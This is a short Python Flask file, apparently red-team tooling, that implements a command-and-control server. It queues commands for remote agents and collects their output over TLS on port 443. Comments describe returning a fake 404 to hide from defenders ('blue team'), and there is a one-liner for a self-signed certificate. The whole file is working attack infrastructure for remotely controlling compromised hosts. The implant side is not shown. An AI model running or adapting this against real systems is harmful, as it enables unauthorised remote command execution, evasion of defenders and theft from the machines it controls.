# c2_server.py
from flask import Flask, request, jsonify
import ssl, hashlib, os

app = Flask(__name__)

# Shared secret - agents must include this in every request
AGENT_SECRET = hashlib.sha256(b"foxtrot-redteam-2026").hexdigest()
pending_commands = {}   # agent_id -> command queue
results = {}            # agent_id -> output history

def verify(req):
    return req.headers.get("X-Agent-Token") == AGENT_SECRET

@app.route("/beacon", methods=["POST"])
def beacon():
    if not verify(request):
        return "Not Found", 404         # looks like a normal 404 to blue team
    data = request.json
    agent_id = data.get("id")
    if data.get("result"):
        results.setdefault(agent_id, []).append(data["result"])
        print(f"\n[{agent_id}] Result:\n{data['result']}")
    cmd = pending_commands.pop(agent_id, None)
    return jsonify({"cmd": cmd})

@app.route("/issue", methods=["POST"])
def issue():
    # You call this from your terminal to queue commands
    data = request.json
    pending_commands[data["id"]] = data["cmd"]
    return jsonify({"status": "queued"})

if __name__ == "__main__":
    # Generate a self-signed cert first:
    # openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes
    app.run(host="0.0.0.0", port=443, ssl_context=("cert.pem", "key.pem"))